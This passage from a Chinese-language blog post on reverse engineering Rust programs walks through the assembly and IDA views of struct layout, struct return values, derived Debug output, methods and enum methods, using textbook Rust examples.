&quot;someusername123&quot;</span><br></pre></td></tr></table></figure>
<p>上面是第一段汇编内容，在源码中，我们是首先对<code>email</code>进行了初始化，在汇编中也是如此。这里分别将两个字符串实例保存到了<code>[rsp+120]</code>和<code>[rsp+144]</code>处。我们之前分析过，<code>String</code>实例在栈中的大小应该为0x18，可见这两个<code>String</code>实例是完全相邻的，中间没有其他的数据。</p>
<h3 id="第二段"><a class="markdownIt-Anchor" href="#第二段"></a> 第二段</h3>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.LBB17_3:</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">160</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">64</span>], rax</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + <span class="number">144</span>]</span><br><span class="line">        movaps  xmmword ptr [rsp + <span class="number">48</span>], xmm0</span><br><span class="line">        lea     rax, [rsp + <span class="number">72</span>]</span><br><span class="line">        mov     rcx, qword ptr [rsp + <span class="number">136</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">88</span>], rcx</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + <span class="number">120</span>]</span><br><span class="line">        movups  xmmword ptr [rsp + <span class="number">72</span>], xmm0</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">96</span>], <span class="number">1</span></span><br><span class="line">        mov     byte ptr [rsp + <span class="number">104</span>], <span class="number">1</span></span><br><span class="line">        mov     qword ptr [rsp + <span class="number">280</span>], rax</span><br><span class="line">        lea     rax, [rip + &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::fmt::Display&gt;::fmt]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">288</span>], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">280</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">32</span>], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">288</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">40</span>], rax</span><br><span class="line">        jmp     .LBB17_6</span><br></pre></td></tr></table></figure>
<p>随后是第二段，这里有一个Rust 1.73与Rust 1.69的不同之处，在老版本中，对于宏将会调用<code>core::fmt::ArgumentV1::new_display</code>将中括号对应的内容转为字符串，而在新版本中，则只会将<code>core::fmt::Display</code>函数地址保存到栈而并不调用。并且结构体中各个元素的内存排列顺序也不相同，通过IDA分析可见在1.73版本中，元素排列与元素定义的顺序相同，但老版本中则不是。这里是因为<code>String</code>实例实现了<code>Display</code>这个<code>Trait</code>，所以能够直接输出。输出时调用的实际上也是<code>Display</code>的<code>Trait</code>。</p>
<p>需要注意的是，第一段中的字符串初始化并不是对结构体的字符串直接进行初始化，而是在栈中另外开辟了0x30大小的空间用于初始化这两个字符串，随后将这段内存的内容复制到结构体中。真正的结构体应该位于<code>[rsp+48]</code>。四个元素的保存地址分别为：<code>[rsp+48]</code>，<code>[rsp+72]</code>，<code>[rsp+96]</code>，<code>[rsp+104]</code>，因此，中间的两条指令<code>mov qword ptr [rsp + 96], 1</code>、<code>mov byte ptr [rsp + 104], 1</code>就是在对<code>sign_in_count</code>和<code>active</code>进行初始化，因为二者一个是整数类型，一个是布尔值，都是不需要通过<code>new</code>进行初始化的，因此可以直接赋值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> revlab::User struc ; (<span class="keyword">sizeof</span>=<span class="number">0x40</span>, align=<span class="number">0x8</span>, copyof_91)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: _ZN6revlab4main17h1e5ad0972ab6a820E/r</span><br><span class="line"><span class="number">00000000</span>                                         ; _ZN6revlab4main17h1e5ad0972ab6a820E/r</span><br><span class="line"><span class="number">00000000</span> username alloc::<span class="built_in">string</span>::String ?        ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">65</span>/w</span><br><span class="line"><span class="number">00000000</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">72</span>/w</span><br><span class="line"><span class="number">00000018</span> email alloc::<span class="built_in">string</span>::String ?           ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">77</span>/o</span><br><span class="line"><span class="number">00000018</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">84</span>/w ...</span><br><span class="line"><span class="number">00000030</span> sign_in_count dq ?                      ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">93</span>/w</span><br><span class="line"><span class="number">00000038</span> active db ?                             ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">9</span>C/w</span><br><span class="line"><span class="number">00000038</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">11</span>C/o</span><br><span class="line"><span class="number">00000039</span> db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>A db ? ; undefined</span><br><span class="line"><span class="number">0000003B</span> db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>C db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>D db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>E db ? ; undefined</span><br><span class="line"><span class="number">0000003F</span> db ? ; undefined</span><br></pre></td></tr></table></figure>
<h3 id="第三段"><a class="markdownIt-Anchor" href="#第三段"></a> 第三段</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.LBB17_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 40]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 32]</span><br><span class="line">        mov     qword ptr [rsp], rcx</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        lea     rax, [rsp + 104]</span><br><span class="line">        mov     qword ptr [rsp + 264], rax</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;bool as core::fmt::Display&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 272], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 264]</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 272]</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 24]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 16]</span><br><span class="line">        mov     rdx, qword ptr [rsp + 8]</span><br><span class="line">        mov     rsi, qword ptr [rsp]</span><br><span class="line">        mov     qword ptr [rsp + 216], rsi</span><br><span class="line">        mov     qword ptr [rsp + 224], rdx</span><br><span class="line">        mov     qword ptr [rsp + 232], rcx</span><br><span class="line">        mov     qword ptr [rsp + 240], rax</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">        lea     rdi, [rsp + 168]</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        lea     rcx, [rsp + 216]</span><br><span class="line">        mov     r8d, 2</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        jmp     .LBB17_8</span><br><span class="line">        </span><br><span class="line">.L__unnamed_7:</span><br><span class="line">        .quad   .L__unnamed_2</span><br><span class="line">        .zero   8</span><br><span class="line">        .quad   .L__unnamed_11</span><br><span class="line">        .asciz  &quot;\002\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_12</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        </span><br><span class="line">.L__unnamed_11:</span><br><span class="line">        .ascii  &quot;, &quot;</span><br><span class="line"></span><br><span class="line">.L__unnamed_12:</span><br><span class="line">        .ascii  &quot;\n&quot;</span><br></pre></td></tr></table></figure>
<p>这一段的工作主要就是输出，通过调试发现，新版rustc在使用<code>println!</code>宏时将不再将临时字符串切片参数保存在栈中，但通过IDA依然可以较为容易地辨别。</p>
<h2 id="struct-作为返回值"><a class="markdownIt-Anchor" href="#struct-作为返回值"></a> Struct 作为返回值</h2>
<p>下面书中给出一个通过函数初始化结构体的实例：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    sign_in_count: <span class="type">u64</span>,</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">build_user</span>(email: <span class="type">String</span>, username: <span class="type">String</span>) <span class="punctuation">-&gt;</span> User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,</span><br><span class="line">        username,</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user1</span> = <span class="title function_ invoke__">build_user</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>), <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, user1.email, user1.active);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">example::build_user:</span><br><span class="line">        mov     rax, rdi</span><br><span class="line">        mov     rcx, qword ptr [rdx]</span><br><span class="line">        mov     qword ptr [rdi], rcx</span><br><span class="line">        mov     rcx, qword ptr [rdx + 8]</span><br><span class="line">        mov     qword ptr [rdi + 8], rcx</span><br><span class="line">        mov     rcx, qword ptr [rdx + 16]</span><br><span class="line">        mov     qword ptr [rdi + 16], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi]</span><br><span class="line">        mov     qword ptr [rdi + 24], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi + 8]</span><br><span class="line">        mov     qword ptr [rdi + 32], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi + 16]</span><br><span class="line">        mov     qword ptr [rdi + 40], rcx</span><br><span class="line">        mov     qword ptr [rdi + 48], 1</span><br><span class="line">        mov     byte ptr [rdi + 56], 1</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>从函数的汇编可以看到，这个函数实际上是将第一个参数作为指针完成初始化的，可以将第一个指针理解为<code>this</code>，这与C++类方法的函数调用规则类似。</p>
<h2 id="实现-debug-trait"><a class="markdownIt-Anchor" href="#实现-debug-trait"></a> 实现 Debug Trait</h2>
<p>一个结构体可以通过<code>#[derive(Debug)]</code>完成对Debug Trait的默认实现：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;rect1 = &#123;:?&#125;&quot;</span>, rect1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 88</span><br><span class="line">        mov     dword ptr [rsp], 30</span><br><span class="line">        mov     dword ptr [rsp + 4], 50</span><br><span class="line">        mov     rax, rsp</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;example::Rect as core::fmt::Debug&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 80], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 72]</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 56], rcx</span><br><span class="line">        mov     qword ptr [rsp + 64], rax</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_4]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 56]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        add     rsp, 88</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，汇编代码中获取的就是<code>Debug</code>这个<code>Trait</code>的函数指针，说明不同的宏实际上调用的函数也不同。如果将<code>&#123;:?&#125;</code>修改为<code>&#123;:#?&#125;</code>，则原先调用的<code>core::fmt::Arguments::new_v1</code>将会改为调用<code>core::fmt::Arguments::new_v1_formatted</code>。考虑到Rust的格式化字符串非常强大与灵活，有多种输出形式，后面将通过专门的分析对宏展开进行分析，这里不深入探讨。</p>
<h2 id="reverse-for-methods"><a class="markdownIt-Anchor" href="#reverse-for-methods"></a> Reverse for Methods</h2>
<p>在Rust中，结构体充当了其他语言中类的功能，可以在结构体下定义方法，使这个方法专属于该结构体。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;area = &#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">area</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">example::Rect::area:</span><br><span class="line">        push    rax</span><br><span class="line">        mov     eax, dword ptr [rdi]</span><br><span class="line">        mul     dword ptr [rdi + 4]</span><br><span class="line">        mov     dword ptr [rsp + 4], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_2</span><br><span class="line">        mov     eax, dword ptr [rsp + 4]</span><br><span class="line">        pop     rcx</span><br><span class="line">        ret</span><br><span class="line">.LBB1_2:</span><br><span class="line">        lea     rdi, [rip + str.0]</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_4]</span><br><span class="line">        mov     rax, qword ptr [rip + core::panicking::panic@GOTPCREL]</span><br><span class="line">        mov     esi, 33</span><br><span class="line">        call    rax</span><br><span class="line">        ud2</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">        sub     rsp, 104</span><br><span class="line">        mov     dword ptr [rsp + 8], 30</span><br><span class="line">        mov     dword ptr [rsp + 12], 50</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        call    example::Rect::area</span><br><span class="line">        mov     dword ptr [rsp + 84], eax</span><br><span class="line">        lea     rax, [rsp + 84]</span><br><span class="line">        mov     qword ptr [rsp + 88], rax</span><br><span class="line">        mov     rax, qword ptr [rip + core::fmt::num::imp::&lt;impl core::fmt::Display for u32&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 96], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 88]</span><br><span class="line">        mov     rax, qword ptr [rsp + 96]</span><br><span class="line">        mov     qword ptr [rsp + 64], rcx</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 64]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        add     rsp, 104</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>由上述汇编可知，这里还是将<code>rdi</code>作为<code>self</code>使用。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">can_hold</span>(&amp;<span class="keyword">self</span>, other: &amp;Rect) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width &gt; other.width &amp;&amp; <span class="keyword">self</span>.height &gt; other.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect2</span> = Rect &#123;width: <span class="number">10</span>, height: <span class="number">40</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">can_hold</span>(&amp;rect2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上面的代码，<code>can_hold</code>方法的参数有两个，都是指针，如果将第二个参数的<code>&amp;</code>去掉，则参数有三个。经过试验发现，当一个结构体中的元素数量较少时，不加<code>&amp;</code>可能会将结构体的每个元素分别作为参数传递，当元素数量较多时，则是首先复制然后传递指针。</p>
<p>对于关联函数，由于其第一个参数并不是<code>self</code>，类似于C++中的类静态函数，不需要首先获取结构体实例即可调用，参数传递与一般的函数相同。</p>
<h1 id="reverse-for-enum-part-2"><a class="markdownIt-Anchor" href="#reverse-for-enum-part-2"></a> Reverse for enum (Part 2)</h1>
<p>对于枚举类型，我们在第二篇文章中已经进行了较为详细的解释，对于枚举类型的内存排布有了一定的了解。</p>
<p>下面对枚举类型中定义的方法进行测试。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::any::Any;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Freshman</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Sophomore</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Junior</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Senior</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_student</span>(grade: <span class="type">i32</span>, name: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;Student&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> grade &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Freshman</span>(name)),</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Sophomore</span>(name)),</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Junior</span>(name)),</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(name)),</span><br><span class="line">        _ =&gt; <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">test</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="keyword">match</span> <span class="keyword">self</span> &#123;</span><br><span class="line">            Student::<span class="title function_ invoke__">Freshman</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Calculus&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Sophomore</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Data Structure&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Junior</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Computer Network&quot;</span>).<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            Student::<span class="title function_ invoke__">Senior</span>(name) =&gt; <span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="string">&quot;Graduation Design&quot;</span>).<span class="title function_ invoke__">to_string</span>()</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="title function_ invoke__">test</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中对于<code>test</code>方法的调用如下：</p>
